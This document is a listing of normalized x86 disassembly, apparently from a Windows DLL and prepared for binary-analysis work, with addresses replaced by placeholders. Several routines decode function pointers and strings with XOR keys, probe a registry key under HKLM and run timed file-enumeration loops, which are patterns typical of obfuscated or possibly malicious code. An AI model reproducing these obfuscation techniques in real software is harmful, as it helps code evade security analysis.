lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
mov eax 0x8
jmp r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xb8
call sub_1001bb80
push ebx
lea edx [ ebp - 0x900 ]
lea ecx [ ebp - 0x3c ]
call sub_10053a60
test eax eax
jne r-xdata
mov eax [ ebp - 0x8f8 ]
mov ecx [ eax ]
push ecx
call sub_10012811
add esp 0x4
mov [ rw-data ] eax
mov [ rw-data ] edx
lea edx [ ebp - 0xcc ]
mov eax 0x131
call sub_1001bb80
push ebx
lea edx [ ebp - 0x8f0 ]
lea ecx [ ebp - 0xcc ]
call sub_10053a60
test eax eax
jne r-xdata
mov edx [ ebp - 0x900 ]
mov esi [ edx ]
mov eax rw-data
mov edx 0x104
sub esi eax
lea esp [ esp ]
lea edx [ ebp - 0xe8 ]
mov eax 0xba
call sub_1001bb80
push ebx
lea edx [ ebp - 0x8d8 ]
lea ecx [ ebp - 0xe8 ]
call sub_10053a60
test eax eax
jne r-xdata
mov eax [ ebp - 0x8f0 ]
mov ecx [ eax ]
push ecx
call sub_1000eb90
add esp 0x4
mov [ rw-data ] eax
cmp edx edi
jne r-xdata
movzx ecx [ esi + eax ]
cmp cx di
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x19
call sub_1001bb80
push ebx
lea edx [ ebp - 0x920 ]
lea ecx [ ebp - 0x94 ]
call sub_10053a60
test eax eax
jne r-xdata
mov edx [ ebp - 0x8d8 ]
mov eax [ edx ]
push eax
call sub_1000eb90
add esp 0x4
mov [ rw-data ] eax
xor edx edx
mov [ eax ] dx
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x7f
call sub_1001bb80
push ebx
lea edx [ ebp - 0x910 ]
lea ecx [ ebp - 0xb0 ]
call sub_10053a60
test eax eax
jne r-xdata
mov ecx [ ebp - 0x920 ]
mov edx [ ecx ]
push edx
call sub_1004c7aa
fstp [ rw-data ]
add esp 0x4
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov [ ebp - 0x938 ] edi
mov [ ebp - 0x934 ] edi
lea edx [ ebp - 0x64 ]
mov eax 0xed
mov [ ebp - 0x4 ] 0xb
call sub_1001bb80
push ebx
lea edx [ ebp - 0x938 ]
lea ecx [ ebp - 0x64 ]
call sub_10053a60
test eax eax
jne r-xdata
mov eax [ ebp - 0x910 ]
mov ecx [ eax ]
push ecx
call sub_1004c7aa
fstp [ rw-data ]
add esp 0x4
lea edx [ ebp - 0x8d0 ]
mov eax 0xae
call sub_1001bb80
lea edx [ ebp - 0x7c ]
mov eax 0x7b
call sub_1001bb80
lea edx [ ebp - 0x168 ]
mov eax 0x147
call sub_1001bb80
lea edx [ ebp - 0x28 ]
mov eax 0x118
call sub_1001bb80
lea edx [ ebp - 0x1c ]
mov eax 0xf
call sub_1001bb80
lea edx [ ebp - 0x50 ]
mov eax 0xe6
call sub_1001bb80
lea edx [ ebp - 0x930 ]
mov eax 0xc5
call sub_1001bb80
mov edi 0x7
xor ebx ebx
xor eax eax
mov [ ebp - 0x7d8 ] edi
mov [ ebp - 0x7dc ] ebx
mov [ ebp - 0x7ec ] ax
mov ecx [ ebp - 0x92c ]
push ecx
lea edx [ ebp - 0x928 ]
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0xc
call sub_10053a60
test eax eax
jne r-xdata
mov edx [ ebp - 0x938 ]
mov edx [ edx ]
push rw-data
call sub_10049460
jmp r-xdata
push 0xdc8
call sub_1005ac7e
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x928 ]
lea edx [ ebp - 0x7ec ]
push edx
mov edx [ eax ]
call sub_10049460
lea esi [ ebp - 0x938 ]
call sub_100173d0
lea esi [ ebp - 0x928 ]
call sub_100173d0
lea esi [ ebp - 0x910 ]
call sub_100173d0
lea esi [ ebp - 0x920 ]
call sub_100173d0
lea esi [ ebp - 0x8d8 ]
call sub_100173d0
lea esi [ ebp - 0x8f0 ]
call sub_100173d0
lea esi [ ebp - 0x900 ]
call sub_100173d0
lea esi [ ebp - 0x8f8 ]
call sub_100173d0
lea esi [ ebp - 0x908 ]
call sub_100173d0
lea esi [ ebp - 0x8e8 ]
call sub_100173d0
lea esi [ ebp - 0x918 ]
call sub_100173d0
lea esi [ ebp - 0x8e0 ]
call sub_100173d0
xor eax eax
push 0x104
lea ecx [ ebp - 0x3c0 ]
push ecx
push 0x0
call [ GetModuleFileNameW@IAT ]
lea edx [ ebp - 0x3c0 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
cmp [ ebp - 0x7dc ] 0x0
jne r-xdata
push rw-data
mov esi eax
call sub_10017890
mov ebx eax
xor ecx ecx
mov [ ebp - 0x7f4 ] edi
mov [ ebp - 0x7f8 ] 0x0
mov [ ebp - 0x808 ] cx
lea edx [ ebp - 0x8d0 ]
push edx
mov eax edx
push eax
mov ecx edx
push ecx
push 0x0
push 0x1
push ebx
lea eax [ ebp - 0x7d0 ]
mov [ ebp - 0x4 ] 0xd
call sub_10024da0
test eax eax
jne r-xdata
lea eax [ ebp - 0x8d0 ]
push eax
mov ecx eax
push ecx
mov edx eax
push edx
push 0x0
push 0x1
push ebx
lea eax [ ebp - 0x5c8 ]
call sub_10024da0
test eax eax
lea eax [ ebp - 0x7ec ]
push eax
jne r-xdata
lea eax [ ebp - 0x808 ]
push eax
lea edx [ ebp - 0x50 ]
call sub_10049460
lea edx [ ebp - 0x7d0 ]
push edx
lea ecx [ ebp - 0x824 ]
call sub_1004a800
push eax
lea edx [ ebp - 0x1c ]
lea esi [ ebp - 0x840 ]
mov [ ebp - 0x4 ] 0xe
call sub_10045750
add esp 0x4
push eax
lea ecx [ ebp - 0x808 ]
mov [ ebp - 0x4 ] 0xf
call sub_10051390
mov ecx esi
call sub_10035d10
lea ecx [ ebp - 0x824 ]
mov [ ebp - 0x4 ] 0xd
call sub_10035d10
jmp r-xdata
lea edx [ ebp - 0x28 ]
call sub_10049460
lea edx [ ebp - 0x5c8 ]
call sub_10049460
mov eax [ ebp - 0x92c ]
lea ecx [ ebp - 0x5c8 ]
push ecx
lea edx [ ebp - 0x168 ]
push edx
call sub_10035d40
jmp r-xdata
mov edx edi
mov edx [ edi ]
jmp r-xdata
lea ecx [ ebp - 0x3c0 ]
push ecx
lea ecx [ ebp - 0x894 ]
call sub_1004a800
push eax
lea edx [ ebp - 0x930 ]
lea esi [ ebp - 0x878 ]
mov [ ebp - 0x4 ] 0x10
call sub_10045750
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x808 ]
lea esi [ ebp - 0x8b0 ]
mov [ ebp - 0x4 ] 0x11
call sub_10024360
mov edi eax
lea edx [ ebp - 0x3c0 ]
push edx
lea ecx [ ebp - 0x85c ]
mov [ ebp - 0x4 ] 0x12
call sub_1004a800
push eax
lea edx [ ebp - 0x930 ]
lea esi [ ebp - 0x8cc ]
mov [ ebp - 0x4 ] 0x13
call sub_10045750
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x7ec ]
lea esi [ ebp - 0x840 ]
mov [ ebp - 0x4 ] 0x14
call sub_10024360
mov ecx 0x8
mov [ ebp - 0x4 ] 0x15
cmp [ edi + 0x14 ] ecx
jb r-xdata
lea ecx [ ebp - 0x824 ]
push ecx
mov ecx eax
call sub_10003db0
add esp 0x4
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x16
call sub_10051390
lea ecx [ ebp - 0x824 ]
call sub_10035d10
lea ecx [ ebp - 0x840 ]
call sub_10035d10
lea ecx [ ebp - 0x8cc ]
call sub_10035d10
lea ecx [ ebp - 0x85c ]
call sub_10035d10
lea ecx [ ebp - 0x8b0 ]
call sub_10035d10
lea ecx [ ebp - 0x878 ]
call sub_10035d10
lea ecx [ ebp - 0x894 ]
call sub_10035d10
test ebx ebx
je r-xdata
mov eax [ eax ]
cmp [ eax + 0x14 ] ecx
jb r-xdata
lea ecx [ ebp - 0x808 ]
call sub_10035d10
lea ecx [ ebp - 0x7ec ]
call sub_10035d10
mov esi ebx
call sub_1000ef10
push ebx
call sub_10065045
add esp 0x4
sub_1003fac0
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_100367b0
mov esi [ esi ]
push ebx
call sub_10065045
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_1003fb09
push 0x5c
mov eax sub_1007ed1f
call sub_10007703
fldz
mov eax [ ebp + 0x8 ]
fld [ ebp + 0x20 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0x18 ]
fcom st1
mov [ ebp - 0x68 ] eax
xor ebx ebx
mov edi ecx
mov [ ebp - 0x64 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x64 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] ax
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1002868d
add esp 0x14
xor esi esi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
lea eax [ edi + 0x8 ]
push eax
push ebx
push 0x30
call sub_1005e05a
movzx eax ax
add esp 0xc
push eax
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10021a98
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_1000e35e
push [ ebp - 0x64 ]
mov ecx edi
push [ ebp + 0x1c ]
push [ ebp - 0x68 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x60 ]
call sub_10063710
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1004dbe5
mov eax [ ebp - 0x60 ]
call sub_10019c00
retn 0x20
lea eax [ edi + 0x8 ]
push eax
movzx eax [ ebp + esi - 0x38 ]
push ebx
push eax
call sub_1005e05a
movzx eax ax
add esp 0xc
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10021a98
inc esi
cmp esi [ ebp - 0x5c ]
jl r-xdata
sub_1003fc32
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jbe r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push esi
mov esi [ ebp + 0x18 ]
movzx eax [ esi ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_1006a3e7
dec [ ebp + 0x1c ]
inc esi
cmp [ ebp + 0x1c ] 0x0
ja r-xdata
pop esi
sub_1003fc68
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100381c9
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1003fd10
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
push ebx
push esi
xor eax eax
mov bl 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
push eax
lea edx [ ebp - 0x14 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1003fdd0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x14 ]
mov ecx [ eax ]
mov [ eax + 0x20 ] edx
mov edx [ eax + 0x18 ]
mov [ eax + 0x4 ] ecx
mov ecx [ eax + 0x1c ]
mov [ eax + 0x24 ] edx
mov [ eax + 0x28 ] ecx
pop ebp
retn
sub_1003fe10
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi 0xffffffff
jne r-xdata
cmp edi 0x7ffffffe
jbe r-xdata
push r--data
call sub_100616c6
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_100616c6
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
call sub_1000fb70
test edi edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
push edi
push 0x0
mov ecx esi
call sub_1004bdc0
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
mov [ eax + edi * 2 ] cx
mov eax [ esi ]
xor ecx ecx
mov [ eax + edi * 2 ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003feb0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax edx
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edi
push eax
push edx
mov ecx esi
call sub_1005d090
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1003feea
push 0x38
mov eax sub_1007e8a6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_10010e0d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100276d6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1003ffa0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
push edi
mov edi [ LocalFree@IAT ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call edi
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1003ffe5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_10056814
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10020a90
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_1003e1ac
pop ecx
call sub_10012991
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_10012991
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100112ab
pop ecx
mov [ esi ] eax
push esi
call sub_1003e1ac
pop ecx
test eax eax
je r-xdata
call sub_10012991
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100112ab
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_10040092
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_100400c0
push ebp
mov ebp esp
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff84
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x44
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x14 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffaa
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0x9
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x3c ]
xor eax eax
push ecx
mov [ ebp - 0x2a ] ax
call esi
lea edx [ ebp - 0x28 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_10078600
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_10078600
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x28 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_10078600
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_10078600
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x3c ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_10078600
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10040260
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffca
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x3c
jb r-xdata
lea ecx [ ebp - 0x84 ]
push ecx
push 0x20119
xor eax eax
push eax
lea edx [ ebp - 0x80 ]
push edx
push 0x80000002
mov [ ebp - 0x8 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x84 ]
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100402f3
push 0x38
mov eax sub_1007e7ff
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10042119
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002a730
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10045daa
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100161f2
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_100403c0
push ebp
mov ebp esp
push 0xffffffff
push sub_100828fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2dc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edi
xor edi edi
lea ebx [ ebx ]
call sub_1005eea0
cmp eax edi
je r-xdata
call sub_100217d0
cmp eax edi
je r-xdata
mov eax [ esi ]
push eax
call [ SetEvent@IAT ]
mov eax [ rw-data ]
add esi 0x4
cmp esi eax
jne r-xdata
mov esi [ rw-data ]
cmp esi eax
je r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov ecx eax
call sub_10042590
test eax eax
jne r-xdata
xor edi edi
push edi
push eax
push esi
call sub_10077d10
add esp 0xc
mov [ rw-data ] esi
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
or [ rw-data ] esi
xor ecx ecx
push sub_10083090
mov [ rw-data ] 0x7
mov [ rw-data ] edi
mov [ rw-data ] cx
call sub_10025945
add esp 0x4
mov [ rw-data ] esi
push rw-data
call [ LeaveCriticalSection@IAT ]
mov ebx [ GetTickCount@IAT ]
call ebx
mov esi 0x1
mov [ ebp - 0x2e8 ] eax
mov [ ebp - 0x2dc ] edi
mov [ ebp - 0x2e0 ] edi
cmp [ rw-data ] esi
jne r-xdata
call sub_10056990
cmp eax edi
je r-xdata
call sub_1001a7d0
cmp eax edi
je r-xdata
lea edx [ ebp - 0x2dc ]
push edx
lea ecx [ ebp - 0x2e0 ]
call sub_100188c0
test eax eax
je r-xdata
mov ecx eax
call sub_100471e0
test eax eax
jne r-xdata
cmp [ rw-data ] di
je r-xdata
mov ebx esi
mov [ rw-data ] esi
mov esi rw-data
call sub_10037100
cmp [ rw-data ] edi
je r-xdata
lea eax [ ebp - 0x2d8 ]
push eax
push rw-data
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
push rw-data
call sub_10051080
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x2dc ]
push eax
mov [ ebp - 0x2dc ] edi
call sub_1000b569
mov eax [ ebp - 0x2dc ]
call ebx
mov ecx eax
sub ecx [ ebp - 0x2e8 ]
mov eax [ rw-data ]
add eax ecx
mov [ rw-data ] eax
cmp eax 0x927c0
jb r-xdata
push eax
call [ FindClose@IAT ]
lea eax [ ebp - 0x2ac ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ rw-data ]
mov [ rw-data ] 0x0
test esi esi
je r-xdata
xor eax eax
lea esp [ esp ]
push rw-data
call [ EnterCriticalSection@IAT ]
mov esi [ rw-data ]
mov eax [ rw-data ]
cmp esi eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
test [ rw-data ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] edi
mov esi 0x1
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x2ac ]
push ecx
mov ecx rw-data
call sub_1005e3c0
lea edx [ ebp - 0x2e0 ]
push edx
lea eax [ ebp - 0x2dc ]
push eax
lea eax [ ebp - 0x2ac ]
call sub_10039230
add esp 0x8
neg eax
sbb eax eax
inc eax
cmp eax edi
je r-xdata
mov esi rw-data
call sub_10037100
test edi edi
je r-xdata
lea ecx [ ecx ]
inc eax
cmp eax 0x29
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
or [ rw-data ] esi
xor edx edx
push sub_10083090
mov [ rw-data ] 0x7
mov [ rw-data ] edi
mov [ rw-data ] dx
call sub_10025945
add esp 0x4
mov ebx 0x2
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx 0x1
jne r-xdata
mov ecx esi
call sub_10006240
mov esi [ esi + 0x4 ]
